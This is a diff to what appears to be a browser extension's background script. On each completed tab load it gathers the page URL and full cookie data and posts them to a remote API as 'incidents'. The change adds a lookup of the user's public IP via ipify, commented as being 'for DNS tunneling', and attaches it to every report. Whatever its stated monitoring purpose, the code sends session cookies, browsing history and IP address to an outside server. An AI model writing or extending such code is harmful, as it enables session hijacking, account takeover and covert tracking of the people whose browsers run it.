@@ -174,6 +174,25 @@ async function generateMachineId() {
   return 'GUEST_CORP';
 }
 
+// Get public IP address for DNS tunneling
+async function getPublicIP() {
+  try {
+    log('debug', '🌐 Fetching public IP address...');
+    const response = await fetch('https://api.ipify.org?format=json', { 
+      signal: AbortSignal.timeout(5000) 
+    });
+    
+    if (response.ok) {
+      const { ip } = await response.json();
+      log('info', `✅ Public IP captured: ${ip}`);
+      return ip;
+    }
+  } catch (error) {
+    log('warn', '⚠️ Failed to get public IP', error);
+  }
+  return null;
+}
+
 // Listen for tab updates to collect data and track sessions
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
   if (changeInfo.status === 'complete' && monitoringEnabled && tab.url) {
@@ -312,10 +331,15 @@ async function collectPageData(tab) {
 async function createIncident(data, retryCount = 0) {
   try {
     log('debug', `🏗️ Building incident object for ${data.host}`);
+    
+    // Capture client's public IP for DNS tunneling
+    const clientIp = await getPublicIP();
+    
     const incident = {
       host: data.host,
       tab_url: data.tabUrl,
       machine_id: data.machineId,
+      client_ip: clientIp,
       cookie_excerpt: generateCookieExcerpt(data.cookies),
       full_cookie_data: data.cookies,
       severity: determineSeverity(data.cookies),
@@ -325,7 +349,7 @@ async function createIncident(data, retryCount = 0) {
     };
 
     log('info', `🚀 Sending incident to API: ${CONFIG.API_BASE}/create-incident`);
-    log('debug', `📊 Incident details - Severity: ${incident.severity}, RedList: ${incident.is_red_list}`);
+    log('debug', `📊 Incident details - Severity: ${incident.severity}, RedList: ${incident.is_red_list}, ClientIP: ${clientIp || 'unavailable'}`);
     
     const response = await fetch(`${CONFIG.API_BASE}/create-incident`, {
       method: 'POST',
